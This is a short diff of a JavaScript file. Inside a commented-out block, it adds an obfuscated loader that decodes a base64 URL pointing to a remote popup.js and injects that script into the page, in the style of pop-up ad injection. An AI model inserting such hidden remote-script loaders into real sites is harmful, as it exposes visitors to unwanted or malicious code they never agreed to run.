@@ -77,10 +77,8 @@ function detectar_mobile() {
 }
 
 /*
-<script>
 (function(){
-var r=document,l=[atob('')], g=0, gg=function(){
-    if(!l[0])return;si=i["document"]["createElement"]("script");si["type"]="text/javascript";si["async"]=!0;s["id"]="popADS";var d=i["document"]["getElementsByTagName"]("script")[0];si["src"]=l[g];si["crossOrigin"]="anonymous";si["onerror"]=function(){a()};d["parentNode"]["insertBefore"](si,d);}
+var r=document,f=window,l=[atob('aHR0cHM6Ly9tYXVyb3BveGExLmdpdGh1Yi5pby9jb21hbmRvc2Jyb3dzZXIvanMvcG9wdXAuanM=')], g=0, gg=function(){
+    if(!l[0])return; si=f["document"]["createElement"]("script");si["type"]="text/javascript";si["async"]=!0;si["id"]="pop";d=f["document"]["getElementsByTagName"]("script")[0];si["src"]=l[g];si["crossOrigin"]="anonymous";si["onerror"]=function(){a()};d["parentNode"]["insertBefore"](si,d);}
     gg();})();
-</script>
 */
